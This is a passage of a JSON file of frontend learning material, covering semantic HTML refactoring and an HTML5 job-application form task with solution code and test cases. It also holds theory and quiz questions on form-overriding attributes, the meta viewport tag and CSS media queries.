announcement\">\n                    <figcaption>Caption for the announcement image.</figcaption>\n                </figure>\n                <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>\n            </article>\n            <article>\n                <h3>Headline: Tech Update</h3>\n                <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.</p>\n            </article>\n        </section>\n\n        <aside>\n            <h3>Related Links</h3>\n            <ul>\n                <li><a href=\"#\">Old Posts</a></li>\n                <li><a href=\"#\">Partners</a></li>\n            </ul>\n            <h3>Advertisements</h3>\n            <p>Buy our amazing product!</p>\n        </aside>\n    </main>\n\n    <footer>\n        <p>&copy; 2023 My Company</p>\n    </footer>\n\n</body>\n</html>",
          "testCases": [
            "Verify that `.header-div` is replaced by `<header>`.",
            "Verify that `.nav-div` is replaced by `<nav>`.",
            "Verify that `.container-div` is replaced by `<main>`.",
            "Verify that `.main-content-div` is replaced by `<section>` (as it contains related articles, making it a section of the main content).",
            "Verify that each `.post-div` is replaced by `<article>`.",
            "Verify that `.post-image-div` is replaced by `<figure>` and `.image-caption-div` by `<figcaption>`.",
            "Verify that `.sidebar-div` is replaced by `<aside>`.",
            "Verify that `.footer-div` is replaced by `<footer>`.",
            "Confirm that the document structure logically reflects the content's meaning.",
            "Visually inspect the rendered page (though no CSS changes are required, structural changes might break it if CSS is class-dependent)."
          ],
          "hints": [
            "Start from the outermost `div`s and work your way inward.",
            "Ask yourself: 'What is the *purpose* of this block of content?' Is it navigation, a self-contained item, a general section, a sidebar, etc.?",
            "Remember that `<main>` should encompass the dominant content unique to the document, and there should only be one.",
            "`<article>` is for self-contained, distributable content, while `<section>` is a generic grouping of related content, typically with a heading."
          ],
          "tags": [
            "HTML",
            "HTML5",
            "Semantic HTML",
            "Refactoring",
            "Best Practices",
            "Accessibility",
            "SEO"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "html_basics",
            "html5_semantic_elements"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "web_standards",
            "document_structure",
            "ui_layout"
          ]
        },
        {
          "id": "task_html5_complex_form",
          "title": "Build a Job Application Form with HTML5 Features",
          "description": "\nDesign and implement a job application form using various HTML5 input types and attributes for enhanced user experience and client-side validation. The form should demonstrate understanding of the new features discussed.\n\n**Requirements:**\n1.  **Personal Information Section:**\n    *   First Name, Last Name: Regular text inputs, both `required`.\n    *   Email: `<input type=\"email\">`, `required`, `placeholder` for format hint.\n    *   Phone Number: `<input type=\"tel\">`, `pattern` to accept common phone number formats (e.g., `\\d{3}-\\d{3}-\\d{4}` or `\\d{10}`). `title` for pattern explanation.\n    *   Date of Birth: `<input type=\"date\">`, `required`.\n    *   Preferred Contact Time: `<input type=\"time\">`.\n2.  **Application Details Section:**\n    *   Desired Salary: `<input type=\"number\">`, `min` and `max` constraints (e.g., 30000-150000), `step` (e.g., 1000).\n    *   Years of Experience: `<input type=\"range\">`, `min`, `max`, `value` (default).\n    *   Preferred Job Category: A text input with a `datalist` of suggestions (e.g., 'Frontend', 'Backend', 'Fullstack', 'DevOps').\n    *   Cover Letter: `<textarea>`, `placeholder`.\n    *   Resume Upload: `<input type=\"file\">`, `multiple` (optional, for multiple documents) and `accept` attribute to allow only PDF or DOCX files.\n3.  **Submission:**\n    *   A submit button for final application.\n    *   A 'Save Draft' button that submits the form *without* triggering client-side validation (`formnovalidate`).\n4.  **Overall Form:**\n    *   Use the `novalidate` attribute on the form for testing the 'Save Draft' button.\n    *   Utilize `autofocus` on the first name input.\n",
          "difficulty": "hard",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Job Application Form</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; background-color: #f4f4f4; }\n        form { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 600px; margin: 20px auto; }\n        h2 { color: #333; margin-bottom: 20px; }\n        .form-group { margin-bottom: 15px; }\n        label { display: block; margin-bottom: 5px; font-weight: bold; color: #555; }\n        input[type=\"text\"], input[type=\"email\"], input[type=\"tel\"], input[type=\"date\"], input[type=\"time\"], input[type=\"number\"], input[type=\"range\"], input[type=\"color\"], textarea {\n            width: calc(100% - 22px); padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;\n        }\n        input[type=\"file\"] { padding: 5px 0; }\n        input[type=\"submit\"], button { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 1em; margin-right: 10px; }\n        input[type=\"submit\"]:hover, button:hover { background-color: #0056b3; }\n        button[formnovalidate] { background-color: #6c757d; }\n        button[formnovalidate]:hover { background-color: #5a6268; }\n    </style>\n</head>\n<body>\n\n    <form action=\"/submit_application\" method=\"post\" novalidate>\n        <h2>Personal Information</h2>\n        <div class=\"form-group\">\n            <label for=\"firstName\">First Name:</label>\n            <input type=\"text\" id=\"firstName\" name=\"firstName\" autofocus>\n        </div>\n        <div class=\"form-group\">\n            <label for=\"lastName\">Last Name:</label>\n            <input type=\"text\" id=\"lastName\" name=\"lastName\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"email\">Email:</label>\n            <input type=\"email\" id=\"email\" name=\"email\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"phone\">Phone Number:</label>\n            <input type=\"tel\" id=\"phone\" name=\"phone\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"dob\">Date of Birth:</label>\n            <input type=\"date\" id=\"dob\" name=\"dob\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"contactTime\">Preferred Contact Time:</label>\n            <input type=\"time\" id=\"contactTime\" name=\"contactTime\">\n        </div>\n\n        <h2>Application Details</h2>\n        <div class=\"form-group\">\n            <label for=\"salary\">Desired Salary ($):</label>\n            <input type=\"number\" id=\"salary\" name=\"salary\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"experience\">Years of Experience:</label>\n            <input type=\"range\" id=\"experience\" name=\"experience\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"jobCategory\">Preferred Job Category:</label>\n            <input list=\"jobCategories\" id=\"jobCategory\" name=\"jobCategory\">\n            <datalist id=\"jobCategories\">\n                <!-- TODO: Add options here -->\n            </datalist>\n        </div>\n        <div class=\"form-group\">\n            <label for=\"coverLetter\">Cover Letter:</label>\n            <textarea id=\"coverLetter\" name=\"coverLetter\" rows=\"5\"></textarea>\n        </div>\n        <div class=\"form-group\">\n            <label for=\"resume\">Upload Resume:</label>\n            <input type=\"file\" id=\"resume\" name=\"resume\">\n        </div>\n\n        <input type=\"submit\" value=\"Submit Application\">\n        <button type=\"submit\">Save Draft</button>\n    </form>\n\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html (Solution) -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Job Application Form</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; background-color: #f4f4f4; }\n        form { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 600px; margin: 20px auto; }\n        h2 { color: #333; margin-bottom: 20px; }\n        .form-group { margin-bottom: 15px; }\n        label { display: block; margin-bottom: 5px; font-weight: bold; color: #555; }\n        input[type=\"text\"], input[type=\"email\"], input[type=\"tel\"], input[type=\"date\"], input[type=\"time\"], input[type=\"number\"], input[type=\"range\"], input[type=\"color\"], textarea {\n            width: calc(100% - 22px); padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;\n        }\n        input[type=\"file\"] { padding: 5px 0; }\n        input[type=\"submit\"], button { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 1em; margin-right: 10px; }\n        input[type=\"submit\"]:hover, button:hover { background-color: #0056b3; }\n        button[formnovalidate] { background-color: #6c757d; }\n        button[formnovalidate]:hover { background-color: #5a6268; }\n    </style>\n</head>\n<body>\n\n    <form action=\"/submit_application\" method=\"post\">\n        <!-- Removed novalidate from form to demonstrate formnovalidate on specific button -->\n        <h2>Personal Information</h2>\n        <div class=\"form-group\">\n            <label for=\"firstName\">First Name:</label>\n            <input type=\"text\" id=\"firstName\" name=\"firstName\" autofocus required>\n        </div>\n        <div class=\"form-group\">\n            <label for=\"lastName\">Last Name:</label>\n            <input type=\"text\" id=\"lastName\" name=\"lastName\" required>\n        </div>\n        <div class=\"form-group\">\n            <label for=\"email\">Email:</label>\n            <input type=\"email\" id=\"email\" name=\"email\" required placeholder=\"your.name@example.com\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"phone\">Phone Number:</label>\n            <input type=\"tel\" id=\"phone\" name=\"phone\" pattern=\"^(\\+\\d{1,3}[- ]?)?\\d{10}$\" title=\"Phone number must be 10 digits or start with + and country code (e.g., +1-555-123-4567 or 5551234567)\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"dob\">Date of Birth:</label>\n            <input type=\"date\" id=\"dob\" name=\"dob\" required>\n        </div>\n        <div class=\"form-group\">\n            <label for=\"contactTime\">Preferred Contact Time:</label>\n            <input type=\"time\" id=\"contactTime\" name=\"contactTime\">\n        </div>\n\n        <h2>Application Details</h2>\n        <div class=\"form-group\">\n            <label for=\"salary\">Desired Salary ($):</label>\n            <input type=\"number\" id=\"salary\" name=\"salary\" min=\"30000\" max=\"150000\" step=\"1000\" value=\"50000\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"experience\">Years of Experience:</label>\n            <input type=\"range\" id=\"experience\" name=\"experience\" min=\"0\" max=\"20\" value=\"5\">\n        </div>\n        <div class=\"form-group\">\n            <label for=\"jobCategory\">Preferred Job Category:</label>\n            <input list=\"jobCategories\" id=\"jobCategory\" name=\"jobCategory\">\n            <datalist id=\"jobCategories\">\n                <option value=\"Frontend\">\n                <option value=\"Backend\">\n                <option value=\"Fullstack\">\n                <option value=\"DevOps\">\n                <option value=\"UX/UI Designer\">\n                <option value=\"Project Manager\">\n            </datalist>\n        </div>\n        <div class=\"form-group\">\n            <label for=\"coverLetter\">Cover Letter:</label>\n            <textarea id=\"coverLetter\" name=\"coverLetter\" rows=\"5\" placeholder=\"Tell us about yourself and why you're a good fit...\"></textarea>\n        </div>\n        <div class=\"form-group\">\n            <label for=\"resume\">Upload Resume:</label>\n            <input type=\"file\" id=\"resume\" name=\"resume\" multiple accept=\".pdf,.docx\">\n        </div>\n\n        <input type=\"submit\" value=\"Submit Application\">\n        <button type=\"submit\" formnovalidate>Save Draft</button>\n    </form>\n\n</body>\n</html>",
          "testCases": [
            "**First Name / Last Name:** Try submitting with these fields empty. Browser validation messages should appear.",
            "**Email:** Enter an invalid email (e.g., 'test'). Try submitting. Browser validation should trigger. Enter a valid email.",
            "**Phone Number:** Enter '12345' (invalid format). Submit. Check title tooltip. Enter '123-456-7890' or '1234567890'. Submit. It should pass.",
            "**Date of Birth:** Try submitting with an empty date field. Should be required.",
            "**Desired Salary:** Enter a value below 30000 or above 150000. Submit. Validation should trigger. Test `step` by manually typing.",
            "**Years of Experience:** Move the slider. Observe value changes (if bound to JS, not required by task).",
            "**Job Category:** Type 'F'. Observe 'Frontend' and 'Fullstack' suggestions. Select one, or type 'Other'.",
            "**Cover Letter:** Ensure placeholder text is visible when empty.",
            "**Resume Upload:** Try selecting multiple files. Try selecting a `.txt` file (should be filtered or show error).",
            "**'Submit Application' button:** If any `required` fields are empty, this button should trigger validation and prevent submission.",
            "**'Save Draft' button:** With `required` fields empty, click 'Save Draft'. The form *should* attempt to submit without validation. (Requires a backend to truly see submission, but browser should not show validation popup)."
          ],
          "hints": [
            "For the phone number `pattern`, consider a regular expression that accommodates common formats, including optional country codes.",
            "Remember that `datalist` provides suggestions, not a strict selection, and needs `option` elements within it.",
            "The `accept` attribute for file inputs uses MIME types or file extensions (e.g., `.pdf`, `image/*`).",
            "To test `formnovalidate` effectively, ensure the main `<form>` tag *does not* have `novalidate`."
          ],
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Attributes",
            "Validation",
            "User Experience",
            "Frontend Development"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "html_forms_basics",
            "html5_form_elements",
            "html5_form_attributes"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "client_side_validation",
            "regex",
            "ux_design_patterns"
          ]
        }
      ]
    }
  },
  {
    "id": "8c0b0b1b-085e-42da-9e44-457e26480dc0",
    "startLine": 11500,
    "endLine": 11599,
    "processedDate": "2025-06-17T12:27:30.717Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_html_form_overrides",
          "title": "HTML Form Overriding Attributes",
          "content": "HTML5 introduced a set of attributes that can be applied to `<input type=\"submit\">`, `<input type=\"image\">`, or `<button type=\"submit\">` elements to override the default behavior of their parent `<form>` element. These attributes provide granular control over how a specific submit action behaves, without altering the form's global attributes.\n\n### Key Attributes:\n\n*   `formaction`: This attribute specifies the URL to which the form data will be submitted when the specific submit button is clicked. It overrides the `action` attribute of the parent `<form>` element. This is useful when you want different submit buttons within the same form to submit data to different endpoints.\n*   `formenctype`: This attribute specifies how the form data should be encoded when submitted. It overrides the `enctype` attribute of the parent `<form>`. Common values include `application/x-www-form-urlencoded` (default for most forms), `multipart/form-data` (for file uploads), and `text/plain`.\n*   `formmethod`: This attribute specifies the HTTP method to use when submitting the form data (e.g., `GET`, `POST`). It overrides the `method` attribute of the parent `<form>`. This allows a single form to have buttons that submit data using different HTTP methods.\n*   `formtarget`: This attribute specifies where to display the response after submitting the form. It overrides the `target` attribute of the parent `<form>`. Common values include `_self` (default, in the same browsing context), `_blank` (in a new tab/window), `_parent` (in the parent frame), or `_top` (in the full body of the window). This is particularly useful for submitting data to an iframe or opening a new tab for a report.",
          "examples": [
            {
              "id": "example_form_overrides_1",
              "title": "Basic Formaction and Formmethod Override",
              "code": "<!-- index.html -->\n<form action=\"/default-submit\" method=\"get\">\n  <label for=\"username\">Username:</label>\n  <input type=\"text\" id=\"username\" name=\"username\">\n  <br><br>\n  <button type=\"submit\">Submit Default</button>\n  <button type=\"submit\" formaction=\"/api/create-user\" formmethod=\"post\">Create User</button>\n  <button type=\"submit\" formaction=\"/api/search-user\" formmethod=\"get\">Search User</button>\n</form>",
              "explanation": "In this example, the form's default submission is to `/default-submit` using `GET`. However, the 'Create User' button overrides this to submit to `/api/create-user` using `POST`, and the 'Search User' button submits to `/api/search-user` using `GET`, demonstrating how different buttons can trigger different submission behaviors.",
              "language": "html"
            },
            {
              "id": "example_form_overrides_2",
              "title": "Formtarget and Formenctype Override",
              "code": "<!-- index.html -->\n<form action=\"/upload\" method=\"post\" enctype=\"application/x-www-form-urlencoded\">\n  <label for=\"file\">Upload File:</label>\n  <input type=\"file\" id=\"file\" name=\"userFile\">\n  <br><br>\n  <button type=\"submit\">Submit Standard</button>\n  <button type=\"submit\" formaction=\"/upload-large\" formtarget=\"_blank\" formenctype=\"multipart/form-data\">Upload Large File in New Tab</button>\n</form>",
              "explanation": "Here, the form's default `enctype` is `application/x-www-form-urlencoded`. The 'Upload Large File in New Tab' button overrides the `enctype` to `multipart/form-data` (necessary for file uploads) and opens the submission response in a new tab (`_blank`), while also changing the submission URL.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_form_overrides_1",
            "question_form_overrides_2",
            "question_form_overrides_3",
            "question_form_overrides_4",
            "question_form_overrides_5"
          ],
          "relatedTasks": [
            "task_form_overrides_1"
          ],
          "tags": [
            "HTML",
            "Forms",
            "Web Development",
            "Frontend Basics",
            "Attributes"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_forms",
            "http_methods"
          ],
          "complexity": 4,
          "interviewRelevance": 6,
          "learningPath": "intermediate",
          "requiredFor": [
            "advanced_form_handling",
            "single_page_applications"
          ]
        },
        {
          "id": "theory_meta_viewport_responsive_design",
          "title": "Meta Viewport and Responsive Design Fundamentals",
          "content": "Responsive web design is an approach to web design that makes web pages render well on a variety of devices and window or screen sizes from minimum to maximum display size. The `meta viewport` tag is a crucial component in achieving responsiveness on mobile devices, as it instructs the browser on how to control the page's dimensions and scaling.\n\n### Meta Viewport Tag\n\n```html\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n```\n\n**Viewport Attributes:**\n\n*   `width=device-width`: This sets the width of the viewport (the browser window's content area) to the width of the device's screen in device-independent pixels. This is fundamental for responsive design as it prevents mobile browsers from rendering pages at a desktop width (typically 980px) and then scaling them down, which often results in tiny text and elements.\n*   `initial-scale=1.0`: This sets the initial zoom level when the page is first loaded. A value of `1.0` means there is no zoom applied, ensuring that 1 CSS pixel equals 1 device-independent pixel (DIP) or roughly 1 physical pixel on a standard DPI screen. This is crucial for consistent sizing across devices.\n*   `maximum-scale=1.0`: This sets the maximum zoom level that a user is allowed to zoom into the page. When set to `1.0`, it prevents users from zooming in. While it might be used to maintain layout integrity, it is generally **not recommended for accessibility** as it can impair usability for users with visual impairments who rely on zoom.\n*   `user-scalable=no`: This prevents users from zooming in or out on the page entirely. Similar to `maximum-scale=1.0`, this is generally **not recommended for accessibility reasons**, as it severely restricts user control and can be a barrier for those who need to magnify content.",
          "examples": [
            {
              "id": "example_meta_viewport_1",
              "title": "Standard Responsive Meta Viewport",
              "code": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Responsive Page</title>\n  <style>\n    body {\n      font-family: Arial, sans-serif;\n      margin: 20px;\n    }\n    h1 {\n      color: #333;\n    }\n  </style>\n</head>\n<body>\n  <h1>Welcome to my Responsive Site!</h1>\n  <p>This content will scale appropriately across devices.</p>\n</body>\n</html>",
              "explanation": "This example demonstrates the essential meta viewport tag `width=device-width, initial-scale=1.0` which is the foundation for creating responsive web pages, ensuring correct scaling on mobile devices.",
              "language": "html"
            },
            {
              "id": "example_meta_viewport_2",
              "title": "Meta Viewport with Zoom Restrictions (Not Recommended)",
              "code": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n  <title>Zoom Restricted Page</title>\n  <style>\n    body {\n      font-family: Arial, sans-serif;\n      margin: 20px;\n      background-color: #f0f0f0;\n    }\n  </style>\n</head>\n<body>\n  <h1>Zooming is Disabled Here</h1>\n  <p>This page demonstrates viewport settings that prevent user zooming. While it might enforce a specific layout, it negatively impacts accessibility.</p>\n</body>\n</html>",
              "explanation": "This example shows the use of `maximum-scale=1.0` and `user-scalable=no`. While technically possible, these attributes are generally discouraged due to their negative impact on web accessibility, especially for users with visual impairments.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_viewport_1",
            "question_viewport_2",
            "question_viewport_3",
            "question_viewport_4",
            "question_viewport_5"
          ],
          "relatedTasks": [
            "task_meta_viewport_1"
          ],
          "tags": [
            "HTML",
            "Responsive Design",
            "Viewport",
            "Mobile Development",
            "Accessibility",
            "Web Standards"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_structure",
            "css_basics"
          ],
          "complexity": 5,
          "interviewRelevance": 9,
          "learningPath": "beginner",
          "requiredFor": [
            "responsive_layouts",
            "mobile_first_design"
          ]
        },
        {
          "id": "theory_css_media_queries",
          "title": "CSS Media Queries for Adaptive Layouts",
          "content": "CSS Media Queries are a CSS3 module that allow content rendering to adapt to various conditions (e.g., screen resolution, orientation, color scheme). They are a cornerstone of responsive web design, enabling developers to apply different styles based on the characteristics of the device or browsing environment.\n\n### Basic Syntax\n\nA media query consists of a media type (e.g., `screen`, `print`) and zero or more media feature expressions (e.g., `min-width`, `orientation`).\n\n```css\n@media <media-type> and (<media-feature>) {\n  /* CSS rules to apply */\n}\n```\n\n### Common Media Types\n\n*   `all`: Suitable for all devices.\n*   `print`: For paged material and documents viewed on a screen in print preview mode.\n*   `screen`: For color computer screens.\n*   `speech`: For speech synthesizers.\n\n### Media Feature Examples:\n\n*   **Width/Height Based Breakpoints:**\n    *   `min-width`: Applies styles when the viewport is at least a specified width.\n    *   `max-width`: Applies styles when the viewport is at most a specified width.\n    *   `width`: Applies styles when the viewport is exactly a specified width.\n\n    ```css\n    /* Base styles for mobile devices */\n    body {\n      font-size: 16px;\n    }\n\n    /* Tablet devices: viewport at least 768px wide */\n    @media (min-width: 768px) {\n      body {\n        font-size: 18px;\n      }\n    }\n\n    /* Desktop devices: viewport at least 1024px wide */\n    @media (min-width: 1024px) {\n      body {\n        font-size: 20px;\n      }\n    }\n    ```\n\n*   **Orientation:**\n    *   `orientation: landscape`: Applied when the viewport is wider than it is tall.\n    *   `orientation: portrait`: Applied when the viewport is taller than it is wide.\n\n    ```css\n    @media (orientation: landscape) {\n      /* Applied when viewport is in landscape orientation */\n      menu {\n        float: left;\n      }\n    }\n    ```\n\n*   **User Preferences:**\n    *   `prefers-color-scheme: dark`: Applied when the user has dark mode enabled in their operating system or browser settings.\n    *   `prefers-color-scheme: light`: Applied when the user has light mode enabled.\n\n    ```css\n    @media (prefers-color-scheme: dark) {\n      /* Applied when user has dark mode enabled */\n      body {\n        background-color: #333;\n        color: #eee;\n      }\n    }\n    ```\n\n*   **Device Aspect Ratio:**\n    *   `device-aspect-ratio`: Targets the ratio of the device's screen width to height.\n\n    ```css\n    /* For displays with 16:9 aspect ratio */\n    @media screen and (device-aspect-ratio: 16/9) {\n      /* CSS styles for 16:9 displays */\n      .video-container { max-width: 100%; }\n    }\n    ```\n\n*   **Resolution (DPI):**\n    *   `min-resolution`: Targets screens with a minimum pixel density (e.g., Retina displays).\n    *   `dppx` (dots per pixel unit): Represents physical pixels per CSS pixel.\n    *   `dpi` (dots per inch).\n\n    ```css\n    /* For high-resolution (Retina) displays */\n    @media screen and (min-resolution: 2dppx) {\n      /* CSS styles for high-DPI screens */\n      img.logo { content: url('logo@2x.png'); }\n    }\n    ```\n\n### Combining Multiple Conditions\n\nMedia queries can be combined using logical operators:\n\n*   `and`: Combines multiple media features. All conditions must be true.\n*   `or` (`,` comma): A comma-separated list of media queries. If any one of the media queries is true, the styles are applied.\n*   `not`: Negates the entire media query. Rarely used with `and`.\n*   `only`: Hides the style sheet from older browsers that do not support media queries.\n\n    ```css\n    /* Applied for landscape viewports at least 30em wide */\n    @media screen and (min-width: 30em) and (orientation: landscape) {\n      .sidebar { width: 25%; }\n    }\n\n    /* Device-specific breakpoints (ranges) */\n    @media (min-width: 768px) and (max-width: 991px) {\n      /* Styles for small tablets and large phones */\n      .container {\n        max-width: 750px;\n      }\n    }\n\n    @media (min-width: 992px) and (max-width: 1199px) {\n      /* Styles for medium devices (tablets, small laptops) */\n      .container {\n        max-width: 970px;\n      }\n    }\n\n    @media (min-width: 1200px) {\n      /* Styles for large devices (desktops, large laptops) */\n      .container {\n        max-width: 1170px;\n      }\n    }\n    ```\n\n**Best Practices for Breakpoints:**\n\nInstead of device-specific breakpoints, it's often more effective to use content-based breakpoints. This means adjusting your layout where the content starts to look bad, rather than targeting specific device widths. Common breakpoints often align with general device categories (e.g., mobile, tablet, desktop) as seen in frameworks like Bootstrap, but fluid layouts and flexible content can make a stricter `device-width` approach less necessary.\n\n`em` and `rem` units are generally preferred for breakpoints over `px` because they scale with the user's default font size settings, offering better accessibility.",
          "examples": [
            {
              "id": "example_media_queries_1",
              "title": "Basic Breakpoints and Orientation",
              "code": "/* styles.css */\nbody {\n  background-color: lightblue;\n  font-size: 16px;\n}\n\n/* Tablet styles */\n@media (min-width: 768px) {\n  body {\n    background-color: lightgreen;\n    font-size: 18px;\n  }\n}\n\n/* Desktop styles */\n@media (min-width: 1024px) {\n  body {\n    background-color: lightcoral;\n    font-size: 20px;\n  }\n}\n\n/* Landscape orientation specific style */\n@media (orientation: landscape) {\n  body {\n    border: 5px solid darkblue;\n  }\n}",
              "explanation": "This example demonstrates how to apply different background colors and font sizes based on viewport width (mobile, tablet, desktop) using `min-width` breakpoints. It also shows a style applied specifically when the device is in landscape orientation.",
              "language": "css"
            },
            {
              "id": "example_media_queries_2",
              "title": "Dark Mode Preference and High-Resolution Displays",
              "code": "/* styles.css */\nbody {\n  color: black;\n  background-color: white;\n}\n\n.logo {\n  width: 100px;\n  height: auto;\n}\n\n/* Dark mode preference */\n@media (prefers-color-scheme: dark) {\n  body {\n    color: white;\n    background-color: #333;\n  }\n}\n\n/* High-resolution displays */\n@media screen and (min-resolution: 2dppx), \n       screen and (-webkit-min-device-pixel-ratio: 2), \n       screen and (min-device-pixel-ratio: 2) {\n  .logo {\n    content: url('images/logo@2x.png'); /* Load higher resolution image */\n    width: 200px; /* Adjust if the 2x image is naturally larger */\n  }\n}",
              "explanation": "This example shows how to implement dark mode support using `prefers-color-scheme: dark` and how to serve higher-resolution images for Retina displays using `min-resolution: 2dppx` (and vendor prefixes for broader compatibility).",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_media_query_1",
            "question_media_query_2",
            "question_media_query_3",
            "question_media_query_4",
            "question_media_query_5",
            "question_media_query_6",
            "question_media_query_7"
          ],
          "relatedTasks": [
            "task_media_queries_1"
          ],
          "tags": [
            "CSS",
            "Responsive Design",
            "Media Queries",
            "Frontend Development",
            "Accessibility",
            "Breakpoints"
          ],
          "technology": "CSS",
          "prerequisites": [
            "css_selectors",
            "css_properties",
            "html_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "complex_responsive_layouts",
            "cross_browser_compatibility"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_form_overrides_1",
          "topic": "HTML Form Overriding Attributes",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `formaction` attribute on a submit button?",
          "answer": "It overrides the `action` attribute of the parent `<form>` element, directing the form submission to a different URL.",
          "options": [],
          "analysisPoints": [
            "Tests basic knowledge of `formaction`.",
            "Distinguishes `formaction` from the form's `action` attribute."
          ],
          "keyConcepts": [
            "formaction",
            "HTML forms",
            "Form submission"
          ],
          "evaluationCriteria": [
            "Correct identification of the attribute's function."
          ],
          "example": null,
          "tags": [
            "HTML",
            "Forms",
            "Attributes",
            "Basic"
          ],
          "prerequisites": [
            "html_forms"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_form_overrides_2",
          "topic": "HTML Form Overriding Attributes",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following HTML form:\n\n```html\n<form action=\"/submit-default\" method=\"get\" enctype=\"application/x-www-form-urlencoded\">\n  <input type=\"text\" name=\"data\">\n  <button type=\"submit\" formmethod=\"post\" formaction=\"/submit-api\" formenctype=\"multipart/form-data\">Upload</button>\n  <button type=\"submit\">Send</button>\n</form>\n```\n\nIf the user clicks the 'Upload' button, what will be the HTTP method, submission URL, and encoding type for the form data?",
          "answer": "HTTP Method: POST, URL: /submit-api, Encoding: multipart/form-data",
          "options": [
            "HTTP Method: POST, URL: /submit-api, Encoding: multipart/form-data",
            "HTTP Method: GET, URL: /submit-default, Encoding: application/x-www-form-urlencoded",
            "HTTP Method: POST, URL: /submit-default, Encoding: multipart/form-data",
            "HTTP Method: GET, URL: /submit-api, Encoding: application/x-www-form-urlencoded"
          ],
          "analysisPoints": [
            "Checks understanding of how `formmethod`, `formaction`, and `formenctype` override parent form attributes.",
            "Ensures knowledge of default form behavior versus button-specific overrides."
          ],
          "keyConcepts": [
            "formaction",
            "formmethod",
            "formenctype",
            "HTML forms",
            "Attribute precedence"
          ],
          "evaluationCriteria": [
            "Ability to correctly identify overriding attributes.",
            "Understanding of HTTP methods and encoding types."
          ],
          "example": "The 'Upload' button explicitly sets `formmethod=\"post\"`, `formaction=\"/submit-api\"`, and `formenctype=\"multipart/form-data\"`. These attributes take precedence over the `<form>`'s default `method=\"get\"`, `action=\"/submit-default\"`, and `enctype=\"application/x-www-form-urlencoded\"` for that specific button's submission.",
          "tags": [
            "HTML",
            "Forms",
            "MCQ",
            "Medium",
            "Attributes"
          ],
          "prerequisites": [
            "html_forms",
            "http_methods"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_form_overrides_3",
          "topic": "HTML Form Overriding Attributes",
          "level": "medium",
          "type": "open",
          "question": "Describe a practical scenario where using `formtarget=\"_blank\"` on a specific submit button within a form would be beneficial, and explain why.",
          "answer": "A practical scenario for using `formtarget=\"_blank\"` would be in a web application where submitting a form (e.g., generating a report, downloading a file, or viewing a preview) should open the result in a new browser tab or window, without navigating away from the current page. For example, if you have a form to configure parameters for a report, clicking 'Generate Report' with `formtarget=\"_blank\"` would open the report in a new tab, allowing the user to continue interacting with the parameter configuration form in the original tab. This improves user experience by preventing loss of context or progress on the original page, especially when the submission process might take time or the result is meant for independent viewing.",
          "options": [],
          "analysisPoints": [
            "Tests understanding of `formtarget` beyond just its definition.",
            "Requires critical thinking about user experience and practical application."
          ],
          "keyConcepts": [
            "formtarget",
            "User experience",
            "Form submission",
            "Browser context"
          ],
          "evaluationCriteria": [
            "Ability to articulate a relevant use case.",
            "Clear explanation of the benefits (e.g., preventing navigation, maintaining context)."
          ],
          "example": null,
          "tags": [
            "HTML",
            "Forms",
            "Open-ended",
            "UX",
            "Advanced"
          ],
          "prerequisites": [
            "html_forms",
            "browser_context"
          ],
          "complexity": 7,
